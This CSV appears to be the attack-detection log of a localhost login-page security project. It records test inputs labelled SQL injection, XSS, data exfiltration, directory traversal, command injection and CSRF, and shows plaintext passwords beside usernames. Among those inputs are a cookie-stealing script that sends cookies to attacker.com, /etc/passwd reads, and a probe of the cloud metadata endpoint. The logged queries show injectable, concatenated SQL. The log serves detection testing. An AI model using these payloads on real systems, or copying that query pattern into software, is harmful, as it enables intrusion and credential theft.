Timestamp,Username,Query,Attack Detected,Severity,IP Address,User Agent,Login Status
2025-02-18 18:35:06,' OR 1=1 --,SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'jdcjbdjsncj',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
2025-02-18 18:36:36,' OR 1=1 --,SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'jdcjbdjsncj',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
2025-02-18 18:53:58,heyyyy,SELECT * FROM users WHERE username = 'heyyyy' AND password = 'heyl',Failed Login Attempt,Medium,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
2025-02-18 18:54:30,' OR 1=1 --,SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'dbanfklnfknfdknfskln',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
2025-02-19 13:40:08,sri hari,SELECT * FROM users WHERE username = 'sri hari' AND password = 'djkfbjfb',Failed Login Attempt,Medium,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
2025-02-19 13:42:41,laleeth krishna,SELECT * FROM users WHERE username = 'laleeth krishna' AND password = 'kuttykunjan123',Failed Login Attempt,Medium,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
2025-02-23 10:03:54,' OR 1=1 --,SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'cdknclndc',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
2025-02-23 10:11:46,jbkbdjwbcj,SELECT * FROM users WHERE username = 'jbkbdjwbcj' AND password = 'ecnlen',Failed Login Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
2025-02-23 10:13:06,"<script>alert(""XSS"")</script>","SELECT * FROM users WHERE username = '<script>alert(""XSS"")</script>' AND password = 'dcbjk'",XSS Attempt Detected,Medium,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
2025-02-23 10:13:55,"<script>document.write('<img src=x onerror=alert(""Stored XSS"")>');</script>","SELECT * FROM users WHERE username = '<script>document.write('<img src=x onerror=alert(""Stored XSS"")>');</script>' AND password = 'vkdn'",XSS Attempt Detected,Medium,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
2025-02-23 10:32:48,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'admin123',,,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",Successful
2025-02-23 10:35:18,user,SELECT * FROM users WHERE username = 'user' AND password = 'password123',Failed Login Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",Failed
2025-02-23 10:35:43,user1,SELECT * FROM users WHERE username = 'user1' AND password = 'password1',,,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",Successful
2025-02-23 10:37:36,gowtham0205,SELECT * FROM users WHERE username = 'gowtham0205' AND password = 'appu123',Failed Login Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",Failed
2025-02-23 10:38:14,gowtham0205,SELECT * FROM users WHERE username = 'gowtham0205' AND password = 'appu123',Failed Login Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",Failed
2025-02-23 10:46:02,bXlzZWNyZXRwYXNzd29yZA==,SELECT * FROM users WHERE username = 'bXlzZWNyZXRwYXNzd29yZA==' AND password = 'fbb',Data Exfiltration Attempt,Critical,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",Failed
2025-02-23 10:46:57,<script>fetch('https://attacker.com?data='+document.cookie)</script>,SELECT * FROM users WHERE username = '<script>fetch('https://attacker.com?data='+document.cookie)</script>' AND password = 'fbf',XSS Attempt Detected,Medium,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",Failed
2025-02-23 10:47:43,"' UNION SELECT username, password FROM users --","SELECT * FROM users WHERE username = '' UNION SELECT username, password FROM users --' AND password = 'cdd'",SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",Failed
2025-02-23 10:48:11,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'admin123',Data Exfiltration Attempt,Critical,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",Failed
2025-02-23 10:48:37,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'admin123',Data Exfiltration Attempt,Critical,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",Failed
2025-02-23 10:49:27,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'admin123',,,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",Successful
2025-02-23 10:49:35,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'admin123',,,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",Successful
2025-02-25 20:01:10,' OR 1=1 --,SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'scnksnknknck',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",Failed
2025-02-25 20:02:08,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'admin1',Failed Login Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",Failed
2025-02-25 20:02:35,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'admin123',,,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",Successful
2025-02-27 12:22:00,' OR 1=1 --,SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'hdgcjsbl1',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",Failed
2025-02-27 12:23:37,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'admin123',,,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",Successful
2025-03-07 11:32:45,' OR 1=1 --,SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = ' jvjfe ',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",Failed
2025-03-07 11:43:11,' OR 1=1 --,SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'jkkj',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",Failed
2025-03-07 11:50:57,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'admin123',,,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",Successful
2025-03-14 09:02:35,admin'--,SELECT * FROM users WHERE username = 'admin'--' AND password = 'jndkl',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-14 09:02:55,admin'--,SELECT * FROM users WHERE username = 'admin'--' AND password = 'jndkl',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-14 09:03:09,admin'--,SELECT * FROM users WHERE username = 'admin'--' AND password = 'jkk',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-14 19:10:57,admin'--,SELECT * FROM users WHERE username = 'admin'--' AND password = '4 k ',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-14 19:11:35,GOWTHAMARAJ,SELECT * FROM users WHERE username = 'GOWTHAMARAJ' AND password = 'hiiamgowtham',Failed Login Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-14 19:13:25,GOWTHAMARAJ,SELECT * FROM users WHERE username = 'GOWTHAMARAJ' AND password = 'hiiamgowtham',Failed Login Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-14 19:13:35,GOWTHAMARAJ,SELECT * FROM users WHERE username = 'GOWTHAMARAJ' AND password = 'bkjbjb',Failed Login Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-14 19:13:58,admin'--,SELECT * FROM users WHERE username = 'admin'--' AND password = 'jnvkrfv',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-14 19:15:26,GOWTHAMARAJ,SELECT * FROM users WHERE username = 'GOWTHAMARAJ' AND password = 'njkc ',Failed Login Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-20 13:46:01,admin'--,SELECT * FROM users WHERE username = 'admin'--' AND password = 'jbjbk',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-20 14:07:12,admin'--,SELECT * FROM users WHERE username = 'admin'--' AND password = 'sjk x',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-20 19:42:23,admin,Login Query,,,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Successful
2025-03-20 19:42:44,user,Login Query,Failed Login Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-20 19:55:29,admin,Login Query,,,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Successful
2025-03-20 19:55:41,user1,Login Query,Failed Login Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-20 19:55:55,user1,Login Query,,,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Successful
2025-03-20 20:16:01,GOWTHAMARAJ,Failed Login Attempt,Username Not Found,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-21 08:53:12,user1,SELECT * FROM users WHERE username = 'user1' AND password = 'password1',,,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Successful
2025-03-21 08:53:34,admin' UNION SELECT * FROM users; --,SELECT * FROM users WHERE username = 'admin' UNION SELECT * FROM users; --' AND password = 'helloworl',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-21 09:08:55,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'admin123',,,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Successful
2025-03-21 09:09:06,user1,SELECT * FROM users WHERE username = 'user1' AND password = 'password1',,,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Successful
2025-03-21 09:14:56,admin,"SELECT * FROM users WHERE username = 'admin' AND password = 'base64(SELECT username,password FROM users)'",Data Exfiltration Attempt,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-21 09:29:15,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'document.cookie.send(http://attacker.com)',Data Exfiltration Attempt,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-21 09:38:36,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'document.cookie.send(http://attacker.com)',Data Exfiltration Attempt,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-22 20:06:21,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'admin123',,,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Successful
2025-03-22 20:07:25,document.cookie,SELECT * FROM users WHERE username = 'document.cookie' AND password = 'password1',Data Exfiltration Attempt,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-22 20:57:00,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'admin123',,,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Successful
2025-03-22 21:05:07,admin'--,SELECT * FROM users WHERE username = 'admin'--' AND password = 'cec',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-22 21:09:18,admin'--,SELECT * FROM users WHERE username = 'admin'--' AND password = ' ckj c',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-22 21:13:31,admin'--,SELECT * FROM users WHERE username = 'admin'--' AND password = 'cduucb s',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 11:38:35,admin'--,SELECT * FROM users WHERE username = 'admin'--' AND password = 'hi iam gowtham',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 12:02:06,user1,SELECT * FROM users WHERE username = 'user1' AND password = 'password1',,,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Successful
2025-03-23 12:02:34,admin'--,SELECT * FROM users WHERE username = 'admin'--' AND password = 'kj cd',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 12:28:23,' OR 1=1--,SELECT * FROM users WHERE username = '' OR 1=1--' AND password = 'vdvd',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 12:29:29,../../../etc/passwd,SELECT * FROM users WHERE username = '../../../etc/passwd' AND password = 'password',Directory Traversal Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 12:30:23,user1,SELECT * FROM users WHERE username = 'user1' AND password = ' %c0%ae%c0%ae%c0%af/etc/passwd',Directory Traversal Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 12:30:48,admin; cat /etc/passwd,SELECT * FROM users WHERE username = 'admin; cat /etc/passwd' AND password = 'password',Directory Traversal Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 12:31:17,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'password | whoami',Command Injection Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 12:31:35,admin,SELECT * FROM users WHERE username = 'admin' AND password = ' `id`',Command Injection Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 12:31:51,admin,"SELECT * FROM users WHERE username = 'admin' AND password = '<form action=""http://attacker.com/steal"" method=""POST"">'",CSRF Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 12:32:11,https://localhost:8080/admin,SELECT * FROM users WHERE username = 'https://localhost:8080/admin' AND password = 'password',CSRF Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 12:32:44,dict://internal-service:5000/,SELECT * FROM users WHERE username = 'dict://internal-service:5000/' AND password = 'password',CSRF Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 12:33:04,http://169.254.169.254/latest/meta-data/,SELECT * FROM users WHERE username = 'http://169.254.169.254/latest/meta-data/' AND password = 'password',CSRF Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 12:33:33, auth=0,SELECT * FROM users WHERE username = ' auth=0' AND password = 'hey',CSRF Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 12:33:56,role=admin,SELECT * FROM users WHERE username = 'role=admin' AND password = 'bypass=1',CSRF Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 12:34:25,api_key=1234567890abcdef,SELECT * FROM users WHERE username = 'api_key=1234567890abcdef' AND password = 'password',CSRF Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 12:34:51,auth_token=1a2b3c4d5e6f7g8h9i,SELECT * FROM users WHERE username = 'auth_token=1a2b3c4d5e6f7g8h9i' AND password = 'password',CSRF Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 12:35:15,user1,SELECT * FROM users WHERE username = 'user1' AND password = 'bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0',CSRF Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
